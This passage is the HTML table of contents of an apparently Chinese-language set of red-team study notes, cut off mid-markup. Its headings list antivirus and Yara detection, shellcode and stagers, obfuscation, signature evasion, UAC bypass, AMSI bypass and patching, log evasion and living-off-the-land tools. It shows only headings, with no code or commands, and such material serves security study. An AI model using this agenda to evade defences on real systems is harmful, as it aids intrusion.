href="#Asynchronous-Procedure-Calls-%E5%BC%82%E6%AD%A5%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8"><span class="toc-number">3.5.2.</span> <span class="toc-text">Asynchronous Procedure Calls 异步过程调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Section-Manipulation-%E8%8A%82%E5%8C%BA%E6%93%8D%E4%BD%9C"><span class="toc-number">3.5.3.</span> <span class="toc-text">Section Manipulation 节区操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.6.</span> <span class="toc-text">案例分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.7.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">Introduction to Antivirus</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B"><span class="toc-number">4.1.</span> <span class="toc-text">静态检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">4.1.1.</span> <span class="toc-text">工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Yara"><span class="toc-number">4.2.</span> <span class="toc-text">Yara</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Yara-%E5%85%A5%E9%97%A8"><span class="toc-number">4.2.1.</span> <span class="toc-text">Yara 入门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Yara-%E8%A7%84%E5%88%99"><span class="toc-number">4.2.2.</span> <span class="toc-text">Yara 规则</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Meta-%E5%85%83%E6%95%B0%E6%8D%AE"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">Meta 元数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Strings-%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">Strings 字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Conditions-%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.2.2.3.</span> <span class="toc-text">Conditions 条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Combining-keywords-%E7%BB%84%E5%90%88%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-number">4.2.2.4.</span> <span class="toc-text">Combining keywords 组合关键词</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Yara-%E8%A7%84%E5%88%99%E5%89%96%E6%9E%90"><span class="toc-number">4.2.2.5.</span> <span class="toc-text">Yara 规则剖析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Yara-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.2.3.</span> <span class="toc-text">Yara 模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cuckoo-Sandbox"><span class="toc-number">4.2.3.1.</span> <span class="toc-text">Cuckoo Sandbox</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-PE"><span class="toc-number">4.2.3.2.</span> <span class="toc-text">Python PE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Yara-%E5%B7%A5%E5%85%B7"><span class="toc-number">4.2.4.</span> <span class="toc-text">Yara 工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-LOKI"><span class="toc-number">4.2.5.</span> <span class="toc-text">使用 LOKI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-yarGen-%E5%88%9B%E5%BB%BA-Yara-%E8%A7%84%E5%88%99"><span class="toc-number">4.2.6.</span> <span class="toc-text">使用 yarGen 创建 Yara 规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-Yara-%E8%A7%84%E5%88%99"><span class="toc-number">4.2.7.</span> <span class="toc-text">修改 Yara 规则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%A3%80%E6%B5%8B"><span class="toc-number">4.3.</span> <span class="toc-text">动态检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%86%E5%88%AB%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="toc-number">4.4.</span> <span class="toc-text">识别杀毒软件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">AV Evasion: Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PE-%E7%BB%93%E6%9E%84"><span class="toc-number">5.1.</span> <span class="toc-text">PE 结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-PE"><span class="toc-number">5.1.1.</span> <span class="toc-text">什么是 PE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E4%BB%AC%E8%A6%81%E4%BA%86%E8%A7%A3-PE"><span class="toc-number">5.1.2.</span> <span class="toc-text">为什么我们要了解 PE?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode"><span class="toc-number">5.2.</span> <span class="toc-text">Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode-%E5%85%A5%E9%97%A8"><span class="toc-number">5.2.1.</span> <span class="toc-text">Shellcode 入门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%90%86%E8%A7%A3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-Syscall"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">理解系统调用 (Syscall)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-number">5.2.1.2.</span> <span class="toc-text">代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">5.2.1.3.</span> <span class="toc-text">汇编代码的工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95-Shellcode"><span class="toc-number">5.2.1.4.</span> <span class="toc-text">生成与测试 Shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode-%E5%88%A9%E7%94%A8"><span class="toc-number">5.2.2.</span> <span class="toc-text">Shellcode 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Msfvenom-%E7%94%9F%E6%88%90-Shellcode"><span class="toc-number">5.2.2.1.</span> <span class="toc-text">使用 Msfvenom 生成 Shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shellcode-%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">5.2.2.2.</span> <span class="toc-text">Shellcode 加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%88EXE%EF%BC%89%E4%B8%AD%E6%8F%90%E5%8F%96-Shellcode"><span class="toc-number">5.2.2.3.</span> <span class="toc-text">从可执行文件（EXE）中提取 Shellcode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-Payload"><span class="toc-number">5.3.</span> <span class="toc-text">阶段 Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E9%98%B6%E6%AE%B5-Payload"><span class="toc-number">5.3.1.</span> <span class="toc-text">无阶段 Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E9%98%B6%E6%AE%B5-Payload"><span class="toc-number">5.3.2.</span> <span class="toc-text">分阶段 Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E5%90%88%E9%80%82%E7%9A%84-Payload"><span class="toc-number">5.3.3.</span> <span class="toc-text">选择合适的 Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-%E4%B8%AD%E7%9A%84-Stager"><span class="toc-number">5.3.3.1.</span> <span class="toc-text">Metasploit 中的 Stager</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84-Stager"><span class="toc-number">5.3.3.2.</span> <span class="toc-text">创建你自己的 Stager</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%89%8B%E6%AE%B5"><span class="toc-number">5.4.</span> <span class="toc-text">绕过杀软手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86"><span class="toc-number">5.4.1.</span> <span class="toc-text">编码和加密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BC%96%E7%A0%81%E5%99%A8"><span class="toc-number">5.4.1.1.</span> <span class="toc-text">创建自己的编码器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%8C%85%E5%99%A8"><span class="toc-number">5.4.2.</span> <span class="toc-text">打包器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8D%86%E7%BB%91%E5%99%A8"><span class="toc-number">5.4.3.</span> <span class="toc-text">捆绑器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">Obfuscation Principles 混淆原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Origins-of-Obfuscation-%E6%B7%B7%E6%B7%86%E8%B5%B7%E6%BA%90"><span class="toc-number">6.1.</span> <span class="toc-text">Origins of Obfuscation 混淆起源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obfuscation%E2%80%99s-Function-for-Static-Evasion-%E6%B7%B7%E6%B7%86%E5%9C%A8%E9%9D%99%E6%80%81%E8%A7%84%E9%81%BF%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">Obfuscation’s Function for Static Evasion 混淆在静态规避中的作用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Object-Concatenation-%E5%AF%B9%E8%B1%A1%E6%8B%BC%E6%8E%A5"><span class="toc-number">6.2.1.</span> <span class="toc-text">Object Concatenation 对象拼接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-2"><span class="toc-number">6.2.1.1.</span> <span class="toc-text">实践</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obfuscation%E2%80%99s-Function-for-Analysis-Deception-%E6%B7%B7%E6%B7%86%E5%9C%A8%E5%88%86%E6%9E%90%E6%AC%BA%E9%AA%97%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">6.3.</span> <span class="toc-text">Obfuscation’s Function for Analysis Deception 混淆在分析欺骗中的作用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Flow-and-Logic-%E4%BB%A3%E7%A0%81%E6%B5%81%E5%92%8C%E9%80%BB%E8%BE%91"><span class="toc-number">6.3.1.</span> <span class="toc-text">Code Flow and Logic 代码流和逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Arbitrary-Control-Flow-Patterns-%E4%BB%BB%E6%84%8F%E6%8E%A7%E5%88%B6%E6%B5%81%E6%A8%A1%E5%BC%8F"><span class="toc-number">6.3.1.1.</span> <span class="toc-text">Arbitrary Control Flow Patterns 任意控制流模式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8D%E9%80%8F%E6%98%8E%E8%B0%93%E8%AF%8D-Opaque-Predicates"><span class="toc-number">6.3.1.1.1.</span> <span class="toc-text">不透明谓词 (Opaque Predicates)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%80%83%E6%8B%89%E5%85%B9%E7%8C%9C%E6%83%B3%EF%BC%88The-Collatz-Conjecture%EF%BC%89"><span class="toc-number">6.3.1.1.2.</span> <span class="toc-text">考拉兹猜想（The Collatz Conjecture）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Protecting-and-Stripping-Identifiable-Information-%E4%BF%9D%E6%8A%A4%E5%92%8C%E5%89%A5%E7%A6%BB%E5%8F%AF%E8%AF%86%E5%88%AB%E4%BF%A1%E6%81%AF"><span class="toc-number">6.3.2.</span> <span class="toc-text">Protecting and Stripping Identifiable Information 保护和剥离可识别信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%90%8D%E7%A7%B0%E6%B7%B7%E6%B7%86"><span class="toc-number">6.3.2.1.</span> <span class="toc-text">对象名称混淆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%A5%E7%A6%BB%E7%AC%A6%E5%8F%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">6.3.2.2.</span> <span class="toc-text">剥离符号信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Structure-%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84"><span class="toc-number">6.3.2.3.</span> <span class="toc-text">Code Structure 代码结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Compilation-Properties-%E6%96%87%E4%BB%B6%E5%92%8C%E7%BC%96%E8%AF%91%E5%B1%9E%E6%80%A7"><span class="toc-number">6.3.2.4.</span> <span class="toc-text">File &amp; Compilation Properties 文件和编译属性</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">Signature Evasion 特征码规避</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Signature-Identification-%E7%AD%BE%E5%90%8D%E8%AF%86%E5%88%AB"><span class="toc-number">7.1.</span> <span class="toc-text">Signature Identification 签名识别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ThreatCheck"><span class="toc-number">7.1.1.</span> <span class="toc-text">ThreatCheck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AMSITrigger"><span class="toc-number">7.1.2.</span> <span class="toc-text">AMSITrigger</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Static-Code-Based-Signatures-%E5%9F%BA%E4%BA%8E%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E7%9A%84%E7%AD%BE%E5%90%8D"><span class="toc-number">7.2.</span> <span class="toc-text">Static Code-Based Signatures 基于静态代码的签名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%B7%B7%E6%B7%86%E6%80%9D%E6%83%B3%E7%9A%84%E5%BD%92%E7%BA%B3"><span class="toc-number">7.2.1.</span> <span class="toc-text">核心混淆思想的归纳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Splitting-and-Merging-Objects-%E6%8B%86%E5%88%86%E4%B8%8E%E5%90%88%E5%B9%B6%E5%AF%B9%E8%B1%A1"><span class="toc-number">7.2.2.</span> <span class="toc-text">Splitting and Merging Objects 拆分与合并对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Removing-and-Obscuring-Identifiable-Information-%E5%88%A0%E9%99%A4%E5%92%8C%E6%A8%A1%E7%B3%8A%E5%8F%AF%E8%AF%86%E5%88%AB%E4%BF%A1%E6%81%AF"><span class="toc-number">7.2.3.</span> <span class="toc-text">Removing and Obscuring Identifiable Information 删除和模糊可识别信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Static-Property-Based-Signatures-%E5%9F%BA%E4%BA%8E%E9%9D%99%E6%80%81%E5%B1%9E%E6%80%A7%E7%9A%84%E7%89%B9%E5%BE%81%E7%AD%BE%E5%90%8D"><span class="toc-number">7.3.</span> <span class="toc-text">Static Property-Based Signatures 基于静态属性的特征签名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Hashes-%E6%96%87%E4%BB%B6-Hash"><span class="toc-number">7.3.1.</span> <span class="toc-text">File Hashes 文件 Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Entropy-%E7%86%B5"><span class="toc-number">7.3.2.</span> <span class="toc-text">Entropy 熵</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Behavioral-Signatures-%E8%A1%8C%E4%B8%BA%E7%89%B9%E5%BE%81%E7%AD%BE%E5%90%8D"><span class="toc-number">7.4.</span> <span class="toc-text">Behavioral Signatures 行为特征签名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E8%A1%A8"><span class="toc-number">7.4.1.</span> <span class="toc-text">导入表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API-%E8%B0%83%E7%94%A8"><span class="toc-number">7.4.2.</span> <span class="toc-text">API 调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%EF%BC%9A%E7%BB%95%E8%BF%87%E5%AF%BC%E5%85%A5%E8%A1%A8-IAT"><span class="toc-number">7.4.3.</span> <span class="toc-text">动态加载：绕过导入表 (IAT)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-3"><span class="toc-number">7.4.4.</span> <span class="toc-text">实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E6%9D%82%E7%83%A9"><span class="toc-number">7.5.</span> <span class="toc-text">大杂烩</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">Bypassing UAC 绕过 UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#UAC-%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">8.1.</span> <span class="toc-text">UAC 的概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Integrity-Levels-%E5%AE%8C%E6%95%B4%E6%80%A7%E7%BA%A7%E5%88%AB"><span class="toc-number">8.1.1.</span> <span class="toc-text">Integrity Levels 完整性级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Filtered-Tokens-%E5%8F%97%E9%99%90%E4%BB%A4%E7%89%8C"><span class="toc-number">8.1.1.1.</span> <span class="toc-text">Filtered Tokens 受限令牌</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%AD%A3%E5%B8%B8%E6%96%B9%E5%BC%8F%E6%89%93%E5%BC%80%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">8.1.1.2.</span> <span class="toc-text">通过正常方式打开应用程序</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAC-%E7%9A%84%E8%AE%BE%E5%AE%9A"><span class="toc-number">8.1.2.</span> <span class="toc-text">UAC 的设定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E4%B8%8A%E5%8F%AA%E6%9C%89%E4%B8%A4%E4%B8%AA%E6%A1%A3"><span class="toc-number">8.1.2.1.</span> <span class="toc-text">实际上只有两个档</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAC-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86"><span class="toc-number">8.1.3.</span> <span class="toc-text">UAC 内部原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-UAC"><span class="toc-number">8.2.</span> <span class="toc-text">绕过 UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-GUI-%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">8.2.1.</span> <span class="toc-text">基于 GUI 的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#msconfig"><span class="toc-number">8.2.1.1.</span> <span class="toc-text">msconfig</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#azman-msc"><span class="toc-number">8.2.1.2.</span> <span class="toc-text">azman.msc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">8.2.2.</span> <span class="toc-text">自动提权的进程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Fodhelper"><span class="toc-number">8.2.2.1.</span> <span class="toc-text">Fodhelper</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-4"><span class="toc-number">8.2.2.2.</span> <span class="toc-text">实践</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9"><span class="toc-number">8.2.2.2.1.</span> <span class="toc-text">清理痕迹</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-WD"><span class="toc-number">8.2.2.2.2.</span> <span class="toc-text">绕过 WD</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-CurVer-%E5%8A%AB%E6%8C%81-UAC"><span class="toc-number">8.2.2.3.</span> <span class="toc-text">利用 CurVer 劫持 UAC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9C%80%E9%AB%98%E7%BA%A7%E7%9A%84-UAC"><span class="toc-number">8.3.</span> <span class="toc-text">绕过最高级的 UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6%EF%BC%9A%E7%A3%81%E7%9B%98%E6%B8%85%E7%90%86%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">8.3.1.</span> <span class="toc-text">案例研究：磁盘清理计划任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E7%BB%95%E8%BF%87-UAC"><span class="toc-number">8.4.</span> <span class="toc-text">自动绕过 UAC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E5%A4%9A%E8%B5%84%E6%BA%90"><span class="toc-number">8.5.</span> <span class="toc-text">更多资源</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">Runtime Detection Evasion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AMSI-%E6%A6%82%E8%A6%81"><span class="toc-number">9.1.</span> <span class="toc-text">AMSI 概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AMSI-%E6%8F%92%E6%A1%A9"><span class="toc-number">9.2.</span> <span class="toc-text">AMSI 插桩</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-AMSI"><span class="toc-number">9.3.</span> <span class="toc-text">绕过 AMSI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-%E9%99%8D%E7%BA%A7"><span class="toc-number">9.3.1.</span> <span class="toc-text">PowerShell 降级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-%E5%8F%8D%E5%B0%84"><span class="toc-number">9.3.2.</span> <span class="toc-text">PowerShell 反射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E8%A1%A5-AMSI"><span class="toc-number">9.3.3.</span> <span class="toc-text">修补 AMSI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="toc-number">9.3.4.</span> <span class="toc-text">自动化工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#amsi-fail"><span class="toc-number">9.3.4.1.</span> <span class="toc-text">amsi.fail</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AMSITrigger-2"><span class="toc-number">9.3.4.2.</span> <span class="toc-text">AMSITrigger</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">9.4.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">Evading Logging and Monitoring</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E8%B7%9F%E8%B8%AA"><span class="toc-number">10.1.</span> <span class="toc-text">事件跟踪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E8%A7%84%E9%81%BF%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">10.2.</span> <span class="toc-text">日志规避的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E8%B7%9F%E8%B8%AA%E5%AE%9E%E7%8E%B0"><span class="toc-number">10.3.</span> <span class="toc-text">事件跟踪实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">10.4.</span> <span class="toc-text">绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84"><span class="toc-number">10.4.1.</span> <span class="toc-text">反射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E8%A1%A5"><span class="toc-number">10.4.2.</span> <span class="toc-text">修补</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-number">10.4.3.</span> <span class="toc-text">组策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E6%97%A5%E5%BF%97%E7%AE%A1%E9%81%93"><span class="toc-number">10.4.4.</span> <span class="toc-text">滥用日志管道</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-5"><span class="toc-number">10.5.</span> <span class="toc-text">实践</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">11.</span> <span class="toc-text">Living Off the Land 土生土长</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Sysinternals"><span class="toc-number">11.1.</span> <span class="toc-text">Windows Sysinternals</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF-Sysinternals"><span class="toc-number">11.1.1.</span> <span class="toc-text">在线 Sysinternals</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOLBAS-%E9%A1%B9%E7%9B%AE"><span class="toc-number">11.2.</span> <span class="toc-text">LOLBAS 项目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tools-Criteria-%E5%B7%A5%E5%85%B7%E6%A0%87%E5%87%86"><span class="toc-number">11.2.1.</span> <span class="toc-text">Tools Criteria 工具标准</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Interesting-Functionalities-%E6%9C%89%E8%B6%A3%E7%9A%84%E5%8A%9F%E8%83%BD"><span class="toc-number">11.2.2.</span> <span class="toc-text">Interesting Functionalities 有趣的功能</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">11.3.</span> <span class="toc-text">文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Certutil"><span class="toc-number">11.3.1.</span> <span class="toc-text">Certutil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BITSAdmin"><span class="toc-number">11.3.2.</span> <span class="toc-text">BITSAdmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FindStr"><span class="toc-number">11.3.3.</span> <span class="toc-text">FindStr</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C"><span class="toc-number">11.4.</span> <span class="toc-text">文件执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Explorer"><span 